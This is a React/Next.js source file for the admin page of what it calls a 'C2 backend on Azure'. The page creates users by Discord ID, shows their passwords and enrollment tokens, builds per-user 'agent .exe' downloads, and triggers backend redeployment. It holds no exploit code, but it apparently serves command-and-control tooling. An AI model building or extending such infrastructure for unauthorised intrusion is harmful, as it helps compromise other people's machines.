"use client";

import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import {
  Button,
  Card,
  Text,
  Input,
  makeStyles,
  tokens,
  Spinner,
  Badge,
  Tooltip,
  Divider,
  Table,
  TableBody,
  TableCell,
  TableHeader,
  TableHeaderCell,
  TableRow,
} from "@fluentui/react-components";
import {
  ArrowUploadRegular,
  CheckmarkCircleRegular,
  DismissCircleRegular,
  PersonRegular,
  CopyRegular,
  PersonAddRegular,
  ArrowDownloadRegular,
  HomeRegular,
  ServerRegular,
  CheckmarkRegular,
} from "@fluentui/react-icons";
import { useAuth } from "@/lib/auth";
import { createUser, getUsers, downloadAgent, type ManagedUser, type CreateUserResponse } from "@/lib/api";

const useStyles = makeStyles({
  root: {
    display: "flex",
    flexDirection: "column",
    height: "100vh",
    backgroundColor: tokens.colorNeutralBackground1,
  },
  header: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "16px 28px",
    backgroundColor: tokens.colorNeutralBackground2,
    borderBottom: `1px solid ${tokens.colorNeutralStroke2}`,
    gap: "12px",
  },
  headerLeft: {
    display: "flex",
    flexDirection: "column",
    gap: "2px",
  },
  body: {
    flex: 1,
    padding: "28px 32px",
    overflowY: "auto",
    display: "flex",
    flexDirection: "column",
    gap: "24px",
    maxWidth: "1200px",
  },
  card: {
    padding: "20px 24px",
    display: "flex",
    flexDirection: "column",
    gap: "16px",
    border: `1px solid ${tokens.colorNeutralStroke2}`,
  },
  cardHeader: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
  },
  cardTitleRow: {
    display: "flex",
    alignItems: "center",
    gap: "8px",
  },
  createForm: {
    display: "flex",
    gap: "12px",
    alignItems: "end",
  },
  credentialBox: {
    backgroundColor: tokens.colorNeutralBackground5,
    padding: "14px",
    borderRadius: "6px",
    fontFamily: "var(--fontFamilyMonospace)",
    fontSize: "12px",
    lineHeight: "1.8",
    whiteSpace: "pre-wrap",
  },
  mono: {
    fontFamily: "var(--fontFamilyMonospace)",
    fontSize: "12px",
  },
  error: {
    color: tokens.colorPaletteRedForeground1,
    fontSize: tokens.fontSizeBase200,
  },
  deploying: {
    backgroundColor: tokens.colorNeutralBackground5,
    padding: "14px",
    borderRadius: "6px",
    fontFamily: "var(--fontFamilyMonospace)",
    fontSize: "12px",
    whiteSpace: "pre-wrap",
    maxHeight: "360px",
    overflowY: "auto",
    lineHeight: "1.5",
  },
  actions: {
    display: "flex",
    gap: "10px",
    alignItems: "center",
  },
});

function CopyButton({ value }: { value: string }) {
  const [copied, setCopied] = useState(false);
  function handleCopy() {
    navigator.clipboard.writeText(value).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  }
  return (
    <Tooltip content={copied ? "Copied!" : "Copy"} relationship="label">
      <Button
        appearance="subtle"
        size="small"
        icon={copied ? <CheckmarkCircleRegular color={tokens.colorPaletteGreenForeground1} /> : <CopyRegular />}
        onClick={handleCopy}
      />
    </Tooltip>
  );
}

interface DeployResult {
  status: "success" | "error" | string;
  message?: string;
  logs?: string;
}

export function AdminContainer() {
  const styles = useStyles();
  const { user, logout, token } = useAuth();
  const router = useRouter();

  // Deploy state
  const [deploying, setDeploying] = useState(false);
  const [deployResult, setDeployResult] = useState<DeployResult | null>(null);

  // User management state
  const [users, setUsers] = useState<ManagedUser[]>([]);
  const [loadingUsers, setLoadingUsers] = useState(true);
  const [discordId, setDiscordId] = useState("");
  const [creating, setCreating] = useState(false);
  const [createError, setCreateError] = useState("");
  const [newCreds, setNewCreds] = useState<CreateUserResponse | null>(null);
  const [downloadingId, setDownloadingId] = useState<string | null>(null);

  const loadUsers = useCallback(async () => {
    if (!token) return;
    try {
      const data = await getUsers(token);
      setUsers(data);
    } catch {
      // ignore
    } finally {
      setLoadingUsers(false);
    }
  }, [token]);

  useEffect(() => {
    loadUsers();
  }, [loadUsers]);

  const handleCreateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!token || !discordId.trim()) return;
    setCreating(true);
    setCreateError("");
    setNewCreds(null);
    try {
      const result = await createUser(discordId.trim(), token);
      setNewCreds(result);
      setDiscordId("");
      loadUsers();
    } catch (err) {
      setCreateError(err instanceof Error ? err.message : "Failed to create user");
    } finally {
      setCreating(false);
    }
  };

  const handleDownloadAgent = async (userId: string, userDiscordId: string) => {
    if (!token) return;
    setDownloadingId(userId);
    try {
      const blob = await downloadAgent(userId, token);
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `agent-${userDiscordId}.exe`;
      a.click();
      URL.revokeObjectURL(url);
    } catch {
      alert("Failed to build/download agent");
    } finally {
      setDownloadingId(null);
    }
  };

  const handleDeploy = async () => {
    setDeploying(true);
    setDeployResult(null);
    try {
      const apiUrl = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:8080";
      const response = await fetch(`${apiUrl}/api/admin/deployment/deploy`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
      });
      const data = await response.json();
      setDeployResult(data);
    } catch (error) {
      setDeployResult({
        status: "error",
        message: error instanceof Error ? error.message : "Deployment failed",
      });
    } finally {
      setDeploying(false);
    }
  };

  if (!user) return null;

  const isAdmin = user.role === "admin";

  if (!isAdmin) {
    return (
      <div className={styles.root}>
        <div className={styles.header}>
          <Text size={500} weight="semibold">Access Denied</Text>
          <Button size="small" onClick={() => router.push("/")}>Back to Dashboard</Button>
        </div>
        <div className={styles.body}>
          <Text>You do not have admin privileges.</Text>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.root}>
      {/* Header */}
      <div className={styles.header}>
        <div className={styles.headerLeft}>
          <Text size={500} weight="semibold">Admin Dashboard</Text>
          <Text size={200} style={{ color: tokens.colorNeutralForeground3 }}>
            User Management &amp; System Controls
          </Text>
        </div>
        <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
          <Badge appearance="filled" color="brand">{user.username}</Badge>
          <Badge appearance="tint" color="important">admin</Badge>
          <Button size="small" icon={<HomeRegular />} onClick={() => router.push("/")}>
            Dashboard
          </Button>
          <Button size="small" onClick={logout}>Logout</Button>
        </div>
      </div>

      <div className={styles.body}>
        {/* ─── Create User Card ─── */}
        <Card className={styles.card}>
          <div className={styles.cardHeader}>
            <div className={styles.cardTitleRow}>
              <PersonAddRegular fontSize={18} color={tokens.colorBrandForeground1} />
              <Text size={400} weight="semibold">Create User</Text>
            </div>
          </div>

          <form onSubmit={handleCreateUser} className={styles.createForm}>
            <div style={{ flex: 1 }}>
              <Input
                placeholder="Discord User ID (e.g. 707836726692937748)"
                value={discordId}
                onChange={(e) => setDiscordId(e.target.value)}
                disabled={creating}
                style={{ width: "100%" }}
              />
            </div>
            <Button
              appearance="primary"
              type="submit"
              disabled={creating || !discordId.trim()}
              icon={creating ? <Spinner size="tiny" /> : <PersonAddRegular />}
            >
              {creating ? "Creating..." : "Create"}
            </Button>
          </form>

          {createError && <Text className={styles.error}>{createError}</Text>}

          {newCreds && (
            <div>
              <Text size={300} weight="semibold" style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "8px" }}>
                <CheckmarkRegular style={{ color: tokens.colorPaletteGreenForeground1 }} /> User Created — Save these credentials!
              </Text>
              <div className={styles.credentialBox}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div>
                    Discord ID: {newCreds.user.discord_id}{"\n"}
                    Password:   {newCreds.password}{"\n"}
                    Token:      {newCreds.user.enrollment_token}
                  </div>
                  <CopyButton value={`Discord ID: ${newCreds.user.discord_id}\nPassword: ${newCreds.password}\nToken: ${newCreds.user.enrollment_token}`} />
                </div>
              </div>
            </div>
          )}
        </Card>

        {/* ─── Users List Card ─── */}
        <Card className={styles.card}>
          <div className={styles.cardHeader}>
            <div className={styles.cardTitleRow}>
              <PersonRegular fontSize={18} color={tokens.colorBrandForeground1} />
              <Text size={400} weight="semibold">Users</Text>
            </div>
            <Badge appearance="tint">{users.length} users</Badge>
          </div>

          {loadingUsers ? (
            <Spinner size="small" label="Loading users..." />
          ) : users.length === 0 ? (
            <Text size={300} style={{ color: tokens.colorNeutralForeground3 }}>
              No users yet. Create one above.
            </Text>
          ) : (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHeaderCell>Discord ID</TableHeaderCell>
                  <TableHeaderCell>Role</TableHeaderCell>
                  <TableHeaderCell>Status</TableHeaderCell>
                  <TableHeaderCell>Enrollment Token</TableHeaderCell>
                  <TableHeaderCell>Actions</TableHeaderCell>
                </TableRow>
              </TableHeader>
              <TableBody>
                {users.map((u) => (
                  <TableRow key={u.id}>
                    <TableCell>
                      <Text className={styles.mono}>{u.discord_id || u.username}</Text>
                    </TableCell>
                    <TableCell>
                      <Badge
                        appearance="tint"
                        color={u.role === "admin" ? "important" : "informative"}
                      >
                        {u.role}
                      </Badge>
                    </TableCell>
                    <TableCell>
                      <Badge
                        appearance="filled"
                        color={u.active ? "success" : "danger"}
                        icon={u.active ? <CheckmarkCircleRegular /> : <DismissCircleRegular />}
                      >
                        {u.active ? "Active" : "Disabled"}
                      </Badge>
                    </TableCell>
                    <TableCell>
                      {u.enrollment_token ? (
                        <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                          <Text className={styles.mono}>
                            {u.enrollment_token.slice(0, 8)}…
                          </Text>
                          <CopyButton value={u.enrollment_token} />
                        </div>
                      ) : (
                        <Text size={200} style={{ color: tokens.colorNeutralForeground3 }}>—</Text>
                      )}
                    </TableCell>
                    <TableCell>
                      {u.role !== "admin" && (
                        <Button
                          size="small"
                          icon={downloadingId === u.id ? <Spinner size="tiny" /> : <ArrowDownloadRegular />}
                          onClick={() => handleDownloadAgent(u.id, u.discord_id)}
                          disabled={downloadingId === u.id}
                        >
                          {downloadingId === u.id ? "Building..." : "Agent .exe"}
                        </Button>
                      )}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </Card>

        {/* ─── Deployment Card ─── */}
        <Card className={styles.card}>
          <div className={styles.cardHeader}>
            <div className={styles.cardTitleRow}>
              <ArrowUploadRegular fontSize={18} color={tokens.colorBrandForeground1} />
              <Text size={400} weight="semibold">Backend Deployment</Text>
            </div>
            {deployResult && (
              <Badge
                appearance="filled"
                color={deployResult.status === "success" ? "success" : "danger"}
                icon={
                  deployResult.status === "success"
                    ? <CheckmarkCircleRegular />
                    : <DismissCircleRegular />
                }
              >
                {deployResult.status}
              </Badge>
            )}
          </div>

          <Text size={300} style={{ color: tokens.colorNeutralForeground2 }}>
            Rebuild and restart the C2 backend on Azure.
          </Text>

          <div className={styles.actions}>
            <Button
              appearance="primary"
              icon={deploying ? <Spinner size="tiny" /> : <ArrowUploadRegular />}
              onClick={handleDeploy}
              disabled={deploying}
            >
              {deploying ? "Deploying…" : "Deploy Now"}
            </Button>
          </div>

          {deployResult?.message && (
            <div>
              <Text size={200} weight="semibold">Message: </Text>
              <Text size={200}>{deployResult.message}</Text>
            </div>
          )}

          {deployResult?.logs && (
            <>
              <Divider />
              <div>
                <Text size={200} weight="semibold" style={{ display: "block", marginBottom: "8px" }}>
                  Deployment Logs
                </Text>
                <div className={styles.deploying}>{deployResult.logs}</div>
              </div>
            </>
          )}
        </Card>
      </div>
    </div>
  );
}
